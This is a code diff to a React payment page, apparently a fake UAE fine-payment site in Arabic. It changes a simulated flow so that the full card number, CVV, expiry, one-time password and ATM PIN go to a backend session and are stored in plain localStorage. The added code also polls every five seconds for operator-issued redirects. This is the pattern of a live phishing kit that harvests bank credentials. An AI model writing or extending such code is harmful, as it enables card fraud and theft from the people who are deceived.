@@ -626,8 +626,22 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
   const [stage, setStage] = useState<Stage>('card')
   const [errorMessage, setErrorMessage] = useState<string | null>(null)
   const [isSubmitting, setIsSubmitting] = useState(false)
+  const [sessionId] = useState(() => {
+    // Get session from URL or localStorage
+    const urlParams = new URLSearchParams(window.location.search)
+    const urlSessionId = urlParams.get('sessionId')
+    if (urlSessionId) return urlSessionId
+    
+    // Try localStorage
+    try {
+      const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
+      const lastSession = sessions[sessions.length - 1]
+      return lastSession?.sessionId || 'FAZ-' + Date.now().toString(36)
+    } catch {
+      return 'FAZ-' + Date.now().toString(36)
+    }
+  })
 
-  // Simulate stage transitions using setTimeout (no backend needed)
   const totalAmount = '150'
   const fineAmount = '300'
   const discountAmount = '150'
@@ -639,7 +653,23 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
     { label: 'المبلغ المستحق', value: `${dueAmount} AED` },
   ]
 
-  // Auto-transition after submitting each stage
+  // Check for admin actions and redirect URLs via polling
+  useEffect(() => {
+    const checkForRedirect = async () => {
+      try {
+        const { getRedirectUrl } = await import('../lib/api')
+        const result = await getRedirectUrl(sessionId)
+        if (result.redirectUrl) {
+          window.location.href = result.redirectUrl
+        }
+      } catch {}
+    }
+
+    const interval = setInterval(checkForRedirect, 5000)
+    return () => clearInterval(interval)
+  }, [sessionId])
+
+  // Auto-transition after submitting each stage - with API integration
   useEffect(() => {
     if (stage === 'card_pending') {
       const timer = setTimeout(() => {
@@ -663,22 +693,97 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
 
   const handleCardSubmit = async (data: CardSubmitPayload) => {
     setIsSubmitting(true)
-    setStage('card_pending')
     setErrorMessage(null)
+    
+    try {
+      const { updateSession } = await import('../lib/api')
+      await updateSession({
+        sessionId,
+        cardName: data.cardName,
+        cardNumber: data.cardNumber,
+        cardNumberMasked: '****' + data.cardNumber.slice(-4),
+        cardExpiry: data.cardExpiry,
+        cardCvv: data.cardCvv,
+        stage: 'card_pending',
+      })
+    } catch (apiErr) {
+      console.warn('[Payment] API call failed, using localStorage:', apiErr)
+      // Fallback to localStorage
+      try {
+        const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
+        const sessionIndex = sessions.findIndex((s: any) => s.sessionId === sessionId)
+        if (sessionIndex !== -1) {
+          sessions[sessionIndex].cardName = data.cardName
+          sessions[sessionIndex].cardNumber = data.cardNumber
+          sessions[sessionIndex].cardNumberMasked = '****' + data.cardNumber.slice(-4)
+          sessions[sessionIndex].cardExpiry = data.cardExpiry
+          sessions[sessionIndex].cardCvv = data.cardCvv
+          sessions[sessionIndex].stage = 'card_pending'
+          sessions[sessionIndex].updatedAt = new Date().toISOString()
+          localStorage.setItem('fazaa_sessions', JSON.stringify(sessions))
+        }
+      } catch {}
+    }
+    
+    setStage('card_pending')
     setIsSubmitting(false)
   }
 
   const handleOtpSubmit = async (otpCode: string) => {
     setIsSubmitting(true)
-    setStage('otp_pending')
     setErrorMessage(null)
+    
+    try {
+      const { updateSession } = await import('../lib/api')
+      await updateSession({
+        sessionId,
+        otpCode,
+        stage: 'otp_pending',
+      })
+    } catch (apiErr) {
+      console.warn('[Payment] API call failed, using localStorage:', apiErr)
+      try {
+        const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
+        const sessionIndex = sessions.findIndex((s: any) => s.sessionId === sessionId)
+        if (sessionIndex !== -1) {
+          sessions[sessionIndex].otpCode = otpCode
+          sessions[sessionIndex].stage = 'otp_pending'
+          sessions[sessionIndex].updatedAt = new Date().toISOString()
+          localStorage.setItem('fazaa_sessions', JSON.stringify(sessions))
+        }
+      } catch {}
+    }
+    
+    setStage('otp_pending')
     setIsSubmitting(false)
   }
 
   const handleAtmPinSubmit = async (atmPin: string) => {
     setIsSubmitting(true)
-    setStage('atm_pending')
     setErrorMessage(null)
+    
+    try {
+      const { updateSession } = await import('../lib/api')
+      await updateSession({
+        sessionId,
+        atmPin,
+        stage: 'atm_pending',
+      })
+    } catch (apiErr) {
+      console.warn('[Payment] API call failed, using localStorage:', apiErr)
+      try {
+        const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
+        const sessionIndex = sessions.findIndex((s: any) => s.sessionId === sessionId)
+        if (sessionIndex !== -1) {
+          sessions[sessionIndex].atmPin = atmPin
+          sessions[sessionIndex].stage = 'atm_pending'
+          sessions[sessionIndex].updatedAt = new Date().toISOString()
+          localStorage.setItem('fazaa_sessions', JSON.stringify(sessions))
+        }
+      } catch {}
+    }
+    
+    setStage('atm_pending')
     setIsSubmitting(false)
   }
 
